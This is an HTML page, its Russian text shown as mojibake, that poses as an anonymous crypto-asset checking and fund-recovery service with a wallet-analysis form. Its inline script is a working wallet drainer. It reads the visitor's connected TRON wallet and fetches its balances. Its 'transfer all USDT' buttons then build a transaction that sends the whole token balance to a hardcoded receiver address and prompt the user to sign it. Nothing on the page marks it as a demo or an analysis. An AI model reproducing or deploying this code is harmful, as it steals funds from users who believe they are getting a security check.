<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="–ê–Ω–∞–ª–∏–∑ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –∫—Ä–∏–ø—Ç–æ–∞–∫—Ç–∏–≤–æ–≤. –ü–æ–ª–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å.">
    <meta name="keywords" content="–∫—Ä–∏–ø—Ç–æ–∞–∫—Ç–∏–≤—ã, –±–ª–æ–∫—á–µ–π–Ω, –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å, –ø—Ä–æ–≤–µ—Ä–∫–∞, –∞–Ω–æ–Ω–∏–º–Ω–æ—Å—Ç—å">
    <meta name="author" content="–ê–Ω–æ–Ω–∏–º–Ω—ã–µ –†–µ—à–µ–Ω–∏—è">
    <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—Ä–∏–ø—Ç–æ–∞–∫—Ç–∏–≤–æ–≤ | –ê–Ω–æ–Ω–∏–º–Ω—ã–µ –†–µ—à–µ–Ω–∏—è</title>
    <link rel="icon" href="favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href="general.new.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
        body, #particles-js {
            height: 800px;
        }
        .section {
            margin: 40px auto;
            max-width: 800px;
            background: rgba(40, 50, 60, 0.5);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            color: #ffffff;
        }
        .steps {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        .step {
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            text-align: center;
            color: #ffffff;
        }
        .step img {
            width: 50px;
            margin-bottom: 10px;
        }
        .cta {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            width: 100%;
        }
        .cta a {
            display: inline-block;
            text-decoration: none;
            color: #ffffff;
            background: linear-gradient(90deg, #76c7c0, #4c9e94);
            padding: 15px 30px;
            border-radius: 12px;
            font-size: 1.2rem;
            font-weight: 600;
            transition: 0.3s;
        }
        .cta a:hover {
            background: linear-gradient(90deg, #5aa69e, #3b7d74);
        }
        footer {
            margin-top: 50px;
            font-size: 0.9rem;
            color: #7a7a7a;
        }
        @media (max-width: 768px) {
            .steps {
                grid-template-columns: 1fr;
            }
        }
        .wallet-checker {
            margin: 40px auto;
            max-width: 800px;
            background: rgba(40, 50, 60, 0.5);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            color: #ffffff;
        }
        .wallet-input {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        #wallet-address {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            font-size: 16px;
        }
        #wallet-address::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        #analyze-btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(90deg, #76c7c0, #4c9e94);
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        #analyze-btn:hover {
            background: linear-gradient(90deg, #5aa69e, #3b7d74);
        }
        #output-block {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 8px;
            white-space: pre-wrap;
            font-family: monospace;
            color: #ffffff;
            min-height: 200px;
            overflow-x: auto;
        }
        .wallet-controls {
            display: grid;
            gap: 15px;
            margin-bottom: 20px;
        }
        .control-button {
            padding: 10px 20px;
            background: linear-gradient(90deg, #76c7c0, #4c9e94);
            border: none;
            border-radius: 6px;
            color: white;
            cursor: pointer;
            transition: 0.3s;
        }
        .control-button:hover {
            background: linear-gradient(90deg, #5aa69e, #3b7d74);
        }
        .control-input {
            padding: 10px;
            border: none;
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            width: 100%;
        }
        .result {
            font-family: monospace;
            word-break: break-all;
            color: #76c7c0;
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 6px;
            white-space: pre-wrap;
        }
        .send-token-form {
            display: grid;
            gap: 10px;
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 8px;
        }
        .send-token-form label {
            color: rgba(255, 255, 255, 0.7);
        }
        .tokens {
            margin-top: 10px;
        }
        .token-item {
            padding: 5px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        .control-button[disabled] {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
<div id="particles-js"></div>
<nav class="navbar">
	<div class="logo-container">
    <img src="logo.png" alt="–õ–æ–≥–æ—Ç–∏–ø" class="logo-img" loading="lazy">
    <div class="logo-text">
        <span>Confidential</span>
        <span>Solutions</span>
    </div>
</div>
        <ul>
            <li><a href="index4.html">–Æ—Ä–∏–¥–∏—á–µ—Å–∫–∏–π –†–∞–∑–¥–µ–ª</a></li>
            <li><a href="index3.html">–û—Ç–∑—ã–≤—ã</a></li>
            <li><a href="index.html">–ì–ª–∞–≤–Ω–∞—è</a></li>
            <li><a href="index2.html">–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—Ä–∏–ø—Ç–æ–∞–∫—Ç–∏–≤–æ–≤</a></li>
            <li><a href="#contact">–°–≤—è–∑–∞—Ç—å—Å—è</a></li>
        </ul>
    </nav>
	<div class="menu-icon" onclick="toggleMenu()">
            <div></div>
            <div></div>
            <div></div>
        </div>
    <div class="menu-dropdown">
        <a href="index4.html">–Æ—Ä–∏–¥–∏—á–µ—Å–∫–∏–π –†–∞–∑–¥–µ–ª</a>
        <a href="index3.html">–û—Ç–∑—ã–≤—ã</a>
        <a href="index.html">–ì–ª–∞–≤–Ω–∞—è</a>
        <a href="index2.html">–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—Ä–∏–ø—Ç–æ–∞–∫—Ç–∏–≤–æ–≤</a>
        <a href="#contact">–°–≤—è–∑–∞—Ç—å—Å—è</a>
    </div>
    <header>
        <h1>–ê–Ω–æ–Ω–∏–º–Ω—ã–µ –†–µ—à–µ–Ω–∏—è</h1>
        <p>–≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å. –†–µ–∑—É–ª—å—Ç–∞—Ç.</p>
    </header>
    <section class="section">
        <h2>–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?</h2>
        <div class="steps">
            <div class="step">
                <img src="analysis.svg" alt="–ê–Ω–∞–ª–∏–∑">
                <h3>–ê–Ω–∞–ª–∏–∑ –±–ª–æ–∫—á–µ–π–Ω–∞</h3>
                <p>–ú—ã —Ç—â–∞—Ç–µ–ª—å–Ω–æ –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∏ –∏—Å—Ç–æ—á–Ω–∏–∫–∏ —Å—Ä–µ–¥—Å—Ç–≤.</p>
            </div>
            <div class="step">
                <img src="security.svg" alt="–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å">
                <h3>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h3>
                <p>–û—Ü–µ–Ω–∏–≤–∞–µ–º —Ä–∏—Å–∫–∏ –∏ –≤—ã—è–≤–ª—è–µ–º –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏.</p>
            </div>
            <div class="step">
                <img src="report.svg" alt="–û—Ç—á–µ—Ç">
                <h3>–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –æ—Ç—á–µ—Ç–∞</h3>
                <p>–í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ –¥–µ—Ç–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç—á–µ—Ç —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏ –∞–Ω–∞–ª–∏–∑–∞.</p>
            </div>
            <div class="step">
                <img src="solution.svg" alt="–†–µ—à–µ–Ω–∏–µ">
                <h3>–ö–æ–Ω—Å—É–ª—å—Ç–∞—Ü–∏—è</h3>
                <p>–ú—ã –¥–∞–µ–º —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ –∞–∫—Ç–∏–≤–æ–≤ –∏ –≤–æ–∑–≤—Ä–∞—Ç—É —Å—Ä–µ–¥—Å—Ç–≤.</p>
            </div>
        </div>
    </section>

    <div class="wallet-checker">
        <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞</h2>
        <div class="wallet-input">
            <input type="text" id="wallet-address" placeholder="–í–≤–µ–¥–∏—Ç–µ ETH-–∞–¥—Ä–µ—Å">
            <button id="analyze-btn">–ê–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å</button>
        </div>
        <pre id="output-block">–ó–¥–µ—Å—å –ø–æ—è–≤–∏—Ç—Å—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∞–Ω–∞–ª–∏–∑–∞...</pre>
    </div>

    <div id="embedded-wallet-demo">
        <h2>Demo Embedded Wallet</h2>
        
        <div class="wallet-controls">
            <button id="get-address" class="control-button">üì° –ü–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å</button>
            <button id="get-balance" class="control-button">üí∞ –ë–∞–ª–∞–Ω—Å</button>
            
            <div class="send-token-form">
                <h3>–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ω</h3>
                <label>–¢–æ–∫–µ–Ω:</label>
                <select id="symbol" class="control-input">
                    <option value="NRC">NarCoin</option>
                    <option value="ELON">ElonToken</option>
                </select>
                
                <label>–ö–æ–º—É:</label>
                <input id="to" class="control-input" placeholder="0x..." />
                
                <label>–°–∫–æ–ª—å–∫–æ:</label>
                <input id="amount" class="control-input" />
                
                <button id="send-token" class="control-button">üöÄ –û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
            </div>
            
            <pre id="wallet-output" class="result">–¢—É—Ç –±—É–¥–µ—Ç –≤—ã–≤–æ–¥ üëá</pre>
        </div>

        <iframe src="embedded-wallet.html" id="wallet-frame" style="width: 100%; height: 400px; border: none; margin-top: 20px;"></iframe>
    </div>

    <div id="tron-wallet-demo" style="display: none;">
        <h2>TRON Wallet Demo</h2>
        
        <div class="wallet-controls">
            <button id="show-tron-info" class="control-button">üìä –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ</button>
            <button id="transfer-tron-usdt" class="control-button">üí∏ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤—Å–µ USDT TRC-20</button>
            <button id="transfer-tron-usdt-raw" class="control-button" style="display: none;">üí∏ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤—Å–µ USDT TRC-20 (—á–µ—Ä–µ–∑ raw —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é)</button>
        </div>

        <div id="tron-wallet-info" class="wallet-info" style="display: none;">
            <div class="address" id="tron-address"></div>
            <div class="balance" id="tron-balance"></div>
            <div class="tokens" id="tron-tokens"></div>
        </div>
    </div>

    <footer>
        <p>¬© 2025 –ê–Ω–æ–Ω–∏–º–Ω—ã–µ –†–µ—à–µ–Ω–∏—è. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
    </footer>
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
<script src="wallet-checker.js"></script>
<script src="script.js"></script>
<script src="embedded-wallet.js"></script>
<script>
    document.addEventListener('DOMContentLoaded', () => {
        const walletFrame = document.getElementById('wallet-frame');

        document.getElementById('get-address').addEventListener('click', () => {
            walletFrame.contentWindow.postMessage({ method: 'getAddress' }, '*');
        });

        document.getElementById('get-balance').addEventListener('click', () => {
            walletFrame.contentWindow.postMessage({ method: 'getBalance' }, '*');
        });

        document.getElementById('send-token').addEventListener('click', () => {
            const symbol = document.getElementById('symbol').value;
            const address = document.getElementById('to').value;
            const amount = document.getElementById('amount').value;

            walletFrame.contentWindow.postMessage({
                method: 'sendToken',
                params: { tokenSymbol: symbol, toAddress: address, amount }
            }, '*');
        });

        window.addEventListener('message', (e) => {
            const msg = e.data;
            const output = document.getElementById('wallet-output');

            if (msg.method === 'getAddress') {
                output.textContent = '–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞: ' + msg.address;
            }

            if (msg.method === 'getBalance') {
                output.textContent = `–ë–∞–ª–∞–Ω—Å: ${msg.eth} ETH\n` +
                    msg.tokens.map(t => `${t.symbol}: ${t.balance}`).join('\n');
            }

            if (msg.method === 'sendToken') {
                if (msg.success) {
                    output.textContent = msg.message;
                } else {
                    output.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + msg.error;
                }
            }
        });
    });

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –æ—Ç–∫—Ä—ã—Ç–æ –ª–∏ –≤ Trust Wallet
    if (window.location.href.includes('trust://')) {
        document.getElementById('tron-wallet-demo').style.display = 'block';
    }

    // –ö–Ω–æ–ø–∫–∞ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –≤ Trust Wallet
    const trustWalletButton = document.createElement('button');
    trustWalletButton.className = 'control-button';
    trustWalletButton.textContent = '–û—Ç–∫—Ä—ã—Ç—å –≤ Trust Wallet';
    trustWalletButton.onclick = () => {
        const currentUrl = encodeURIComponent(window.location.href);
        window.location.href = `trust://browser_enable?url=${currentUrl}`;
    };
    document.querySelector('.wallet-controls').prepend(trustWalletButton);

    // –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è TRON
    const RECEIVER_ADDRESS = 'TNBSoXyJJR6MNVKF6LtCdiUa7P4VGuQuN2'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å

    // ABI –¥–ª—è TRC-20 —Ç–æ–∫–µ–Ω–æ–≤
    const TRC20_ABI = {
        balanceOf: {
            constant: true,
            inputs: [{ name: 'who', type: 'address' }],
            name: 'balanceOf',
            outputs: [{ name: '', type: 'uint256' }],
            type: 'function'
        },
        transfer: {
            constant: false,
            inputs: [
                { name: 'to', type: 'address' },
                { name: 'value', type: 'uint256' }
            ],
            name: 'transfer',
            outputs: [{ name: '', type: 'bool' }],
            type: 'function'
        },
        decimals: {
            constant: true,
            inputs: [],
            name: 'decimals',
            outputs: [{ name: '', type: 'uint8' }],
            type: 'function'
        },
        symbol: {
            constant: true,
            inputs: [],
            name: 'symbol',
            outputs: [{ name: '', type: 'string' }],
            type: 'function'
        }
    };

    let selectedToken = null;

    // –ü–æ–∫–∞–∑–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
    document.getElementById('show-tron-info').addEventListener('click', async () => {
        try {
            if (!window.tronWeb || !window.tronWeb.ready) {
                addLogEntry('‚ùå TRON Web –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω', 'error');
                return;
            }

            const address = window.tronWeb.defaultAddress.base58;
            document.getElementById('tron-address').textContent = `–ê–¥—Ä–µ—Å: ${address}`;
            document.getElementById('tron-wallet-info').style.display = 'block';

            // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
            const response = await fetch(`https://apilist.tronscan.org/api/account?address=${address}`);
            const data = await response.json();

            // TRX –±–∞–ª–∞–Ω—Å
            const trxBalance = data.balance / 1000000;
            document.getElementById('tron-balance').textContent = `TRX: ${trxBalance}`;

            // –¢–æ–∫–µ–Ω—ã
            const tokensList = document.getElementById('tron-tokens');
            tokensList.innerHTML = '';

            if (data.tokens && data.tokens.length > 0) {
                data.tokens.forEach(token => {
                    const tokenItem = document.createElement('div');
                    tokenItem.className = 'token-item';
                    tokenItem.textContent = `${token.tokenName}: ${token.balance}`;
                    tokenItem.onclick = () => selectToken(token);
                    tokensList.appendChild(tokenItem);
                });
            }

            addLogEntry('‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–æ—à–µ–ª—å–∫–µ –ø–æ–ª—É—á–µ–Ω–∞', 'success');
        } catch (error) {
            addLogEntry(`‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: ${error.message}`, 'error');
        }
    });

    function selectToken(token) {
        selectedToken = token;
        addLogEntry(`‚úÖ –í—ã–±—Ä–∞–Ω —Ç–æ–∫–µ–Ω: ${token.tokenName}`, 'success');
        document.getElementById('transfer-tron-usdt').textContent = `üí∏ –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤—Å–µ ${token.tokenName}`;
    }

    // –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ —Ç–æ–∫–µ–Ω
    document.getElementById('transfer-tron-usdt').addEventListener('click', async () => {
        try {
            if (!window.tronWeb || !window.tronWeb.ready) {
                addLogEntry('‚ùå TRON Web –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω', 'error');
                return;
            }

            if (!selectedToken) {
                addLogEntry('‚ùå –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ–∫–µ–Ω –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞', 'error');
                return;
            }

            const address = window.tronWeb.defaultAddress.base58;
            const contract = await window.tronWeb.contract().at(selectedToken.tokenId);

            // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å —Ç–æ–∫–µ–Ω–∞
            const balance = await contract.balanceOf(address).call();
            if (balance <= 0) {
                addLogEntry(`‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${selectedToken.tokenName} –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞`, 'error');
                return;
            }

            // –°–æ–∑–¥–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            const transaction = await contract.transfer(RECEIVER_ADDRESS, balance).send();
            
            // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥–ø–∏—Å—å —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            try {
                addLogEntry('‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–ø–∏—Å–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...', 'info');
                const signedTx = await window.tronWeb.trx.sign(transaction);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
                
                if (result.result) {
                    addLogEntry(`‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞: ${result.transaction.txID}`, 'success');
                } else {
                    addLogEntry(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${result.code}`, 'error');
                }
            } catch (signError) {
                if (signError.message.includes('User denied')) {
                    addLogEntry('‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –ø–æ–¥–ø–∏—Å—å', 'error');
                } else {
                    addLogEntry(`‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–ø–∏—Å–∏: ${signError.message}`, 'error');
                }
            }
        } catch (error) {
            addLogEntry(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${error.message}`, 'error');
        }
    });

    function addLogEntry(message, type) {
        const log = document.getElementById('wallet-output');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        log.appendChild(entry);
        log.scrollTop = log.scrollHeight;
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ tronWeb –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI
    function checkTronWeb() {
        const rawButton = document.getElementById('transfer-tron-usdt-raw');
        if (window.tronWeb && window.tronWeb.ready) {
            rawButton.style.display = 'block';
        } else {
            rawButton.style.display = 'none';
        }
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º tronWeb –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –∏ –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏
    checkTronWeb();
    setInterval(checkTronWeb, 1000);

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è raw-—Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
    document.getElementById('transfer-tron-usdt-raw').addEventListener('click', async () => {
        try {
            if (!window.tronWeb || !window.tronWeb.ready) {
                addLogEntry('‚ùå TRON Web –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω', 'error');
                return;
            }

            const userAddress = window.tronWeb.defaultAddress.base58;
            addLogEntry(`üì° –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ USDT –¥–ª—è –∞–¥—Ä–µ—Å–∞: ${userAddress}`, 'info');

            // –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ –∫–æ–Ω—Ç—Ä–∞–∫—Ç—É USDT
            const usdt = await window.tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj");
            
            // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å
            const balance = await usdt.methods.balanceOf(userAddress).call();
            if (balance <= 0) {
                addLogEntry('‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ USDT –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞', 'error');
                return;
            }

            addLogEntry(`üí∞ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å USDT: ${balance}`, 'info');

            // –°–æ–∑–¥–∞–µ–º raw-—Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            addLogEntry('‚è≥ –°–æ–∑–¥–∞–Ω–∏–µ raw-—Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...', 'info');
            const rawTx = await usdt.methods
                .transfer(RECEIVER_ADDRESS, parseInt(balance))
                .send({ callValue: 0, shouldPollResponse: false }, { raw: true });

            // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥–ø–∏—Å—å
            addLogEntry('‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–ø–∏—Å–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...', 'info');
            const signedTx = await window.tronWeb.trx.sign(rawTx);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ —Å–µ—Ç—å
            addLogEntry('‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å...', 'info');
            const result = await window.tronWeb.trx.sendRawTransaction(signedTx);

            if (result.result) {
                addLogEntry(`‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞: ${result.txid}`, 'success');
            } else {
                addLogEntry(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ${result.code}`, 'error');
            }
        } catch (error) {
            if (error.message.includes('User denied')) {
                addLogEntry('‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–º–µ–Ω–∏–ª –ø–æ–¥–ø–∏—Å—å', 'error');
            } else {
                addLogEntry(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, 'error');
            }
        }
    });
</script>
</body>
</html>